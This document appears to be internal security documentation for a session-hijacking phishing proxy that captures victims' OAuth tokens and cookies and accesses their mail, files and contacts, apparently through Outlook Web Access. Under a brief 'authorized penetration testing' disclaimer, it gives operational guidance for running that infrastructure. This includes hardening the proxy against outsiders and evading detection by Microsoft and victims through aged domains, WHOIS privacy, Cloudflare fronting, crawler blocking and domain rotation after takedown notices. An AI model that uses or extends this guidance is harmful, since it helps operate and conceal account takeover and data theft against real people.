# Proxy Security Documentation

## Threat Model

### Assets
1. **Captured Cookies** - OAuth session tokens, browser cookies, persistent credentials
2. **Proxy Sessions** - Active browser sessions to victim accounts
3. **Token Data** - OAuth tokens, refresh tokens, access tokens
4. **Victim Data** - Emails, files, calendar, contacts accessed via proxy

### Threat Actors
1. **External Attackers** - Unauthorized users trying to access proxy endpoints
2. **Insiders** - Authorized users with malicious intent
3. **Automated Scanners** - Bots scanning for vulnerabilities
4. **Victim Detection** - Victim discovering proxy domain and reporting it

### Attack Vectors
1. **Unauthorized Proxy Access** - Attacker tries to use proxy without valid session
2. **Session Hijacking** - Attacker intercepts or guesses session tokens
3. **Rate Limiting Bypass** - Attacker tries to bypass rate limits with distributed requests
4. **Cookie Theft** - Attacker tries to extract cookies from database
5. **Domain Detection** - Microsoft or victim detects proxy domain and blocks it
6. **XSS via Proxy** - Attacker injects malicious scripts through proxy responses

## Security Controls

### 1. Rate Limiting
- **Control**: 100 requests per minute per IP address
- **Implementation**: In-memory sliding window rate limiter
- **Purpose**: Prevent abuse, DDoS, and brute force attacks
- **Bypass Difficulty**: High (requires distributed attack from many IPs)

### 2. IP Whitelisting (Optional)
- **Control**: Only allow specific IP addresses or ranges
- **Implementation**: Configurable whitelist via PROXY_IP_WHITELIST env var
- **Purpose**: Restrict access to known operator IPs
- **Bypass Difficulty**: Very High (requires IP spoofing or compromise)

### 3. Security Headers
- **HSTS**: Forces HTTPS for all connections
- **CSP**: Restricts script execution and resource loading
- **X-Frame-Options**: Prevents clickjacking
- **X-Content-Type-Options**: Prevents MIME sniffing
- **Referrer-Policy**: Limits referrer information leakage
- **Permissions-Policy**: Restricts browser features

### 4. Request Logging
- **Control**: All proxy requests logged with IP, method, path, status, size
- **Implementation**: Centralized audit logging
- **Purpose**: Forensic analysis, intrusion detection
- **Retention**: Log rotation recommended (7-30 days)

### 5. Cookie Encryption
- **Control**: Sensitive cookie values encrypted at rest
- **Implementation**: AES-256-GCM encryption via Vault
- **Purpose**: Prevent cookie theft if database is compromised
- **Note**: Currently stored as plain text in SQLite (encryption TBD)

### 6. Session Timeout
- **Control**: Auto-kill after 24 hours
- **Implementation**: Automatic cleanup in scheduler
- **Purpose**: Limit exposure window
- **Override**: Manual kill available via API

### 7. XSS Protection
- **Control**: Sanitize HTML responses
- **Implementation**: Remove script tags, event handlers, javascript URLs
- **Purpose**: Prevent malicious script injection
- **Limitation**: May break some legitimate functionality

### 8. CSRF Protection
- **Control**: Token-based CSRF validation for state-changing operations
- **Implementation**: SHA-256 based tokens with time windows
- **Purpose**: Prevent unauthorized session operations
- **Endpoints**: Session create, kill, refresh

### 9. Domain Stealth
- **Control**: Use aged domains with legitimate appearance
- **Implementation**: Domain registered 2024+, WHOIS privacy, Cloudflare proxy
- **Purpose**: Avoid detection by Microsoft and victims
- **Recommendation**: Rotate domains periodically

### 10. HTTPS Enforcement
- **Control**: All traffic over TLS 1.3
- **Implementation**: Railway auto-SSL, HSTS headers
- **Purpose**: Prevent MITM attacks, traffic interception
- **Certificate**: Auto-renewing Let's Encrypt

## Incident Response

### Detection
1. Monitor proxy logs for unusual traffic patterns
2. Check for multiple failed requests from same IP
3. Monitor for domain blocklisting or takedown notices
4. Alert on session anomalies (multiple simultaneous sessions)

### Response
1. **Immediate**: Kill affected sessions via API
2. **Short-term**: Rotate proxy domain
3. **Medium-term**: Review access logs, identify attack vector
4. **Long-term**: Update security controls, patch vulnerabilities

### Recovery
1. Verify all sessions are killed
2. Clear all captured cookies
3. Rotate OAuth app credentials
4. Deploy new proxy domain
5. Update DNS and SSL certificates

## Compliance Notes

### Legal Considerations
- This system is designed for authorized penetration testing only
- Unauthorized access to computer systems is illegal
- Always obtain explicit written permission before testing
- Comply with all applicable laws (CFAA, GDPR, etc.)

### Data Handling
- Minimize data collection (only capture what's necessary)
- Implement data retention policies (auto-delete after 30 days)
- Encrypt sensitive data at rest
- Secure data transmission (TLS 1.3)
- Access logging and audit trails

### Privacy
- Respect victim privacy (even in authorized testing)
- Don't access personal data unnecessarily
- Report findings responsibly
- Don't share captured data with unauthorized parties

## Security Checklist

- [ ] Rate limiting enabled (100 req/min)
- [ ] IP whitelist configured (if needed)
- [ ] HSTS headers enabled
- [ ] CSP headers configured
- [ ] X-Frame-Options: DENY
- [ ] Request logging active
- [ ] Session timeout: 24 hours
- [ ] HTTPS enforced (TLS 1.3)
- [ ] SSL certificate valid
- [ ] robots.txt blocking crawlers
- [ ] WHOIS privacy enabled
- [ ] Domain not on blocklists
- [ ] Access controls reviewed
- [ ] Audit logs reviewed weekly
- [ ] Incident response plan documented
- [ ] Data retention policy implemented

## Environment Variables

```bash
# Security Configuration
PROXY_RATE_LIMIT=100              # Max requests per minute per IP
PROXY_IP_WHITELIST=               # Comma-separated IPs (optional)
PROXY_SECRET=random_string        # Secret for CSRF tokens
PROXY_MAX_SESSION_HOURS=24        # Session auto-expiry

# Domain Configuration
PROXY_DOMAIN=baloncloud.eu        # Proxy domain
PROXY_ENABLED=true                # Enable proxy

# SSL/TLS
# (Handled automatically by Railway)
```

## Testing Security

Run the security test script:
```bash
./scripts/test_proxy.sh
```

Manual tests:
```bash
# Test rate limiting
for i in {1..105}; do curl -s -o /dev/null -w "%{http_code}\n" https://baloncloud.eu/api/proxy/health; done

# Test security headers
curl -I https://baloncloud.eu/api/proxy/health

# Test IP whitelist (if configured)
curl -H "X-Forwarded-For: 1.2.3.4" https://baloncloud.eu/owa/

# Test SSL
curl -I --http2 https://baloncloud.eu/api/proxy/health

# Test robots.txt
curl https://baloncloud.eu/robots.txt
```

## Vulnerability Disclosure

If you discover a security vulnerability:
1. Do not publicly disclose it
2. Document the vulnerability with reproduction steps
3. Report to the system operator
4. Allow reasonable time for remediation
5. Coordinate disclosure timeline

## Security Updates

- Review security controls monthly
- Update dependencies regularly
- Monitor security advisories for:
  - Rust/actix-web vulnerabilities
  - OpenSSL/TLS vulnerabilities
  - Cloudflare security updates
  - Microsoft security changes

## Contact

For security-related inquiries, contact the system operator.

---

**Document Version**: 1.0
**Last Updated**: 2026-06-13
**Classification**: Internal Use Only
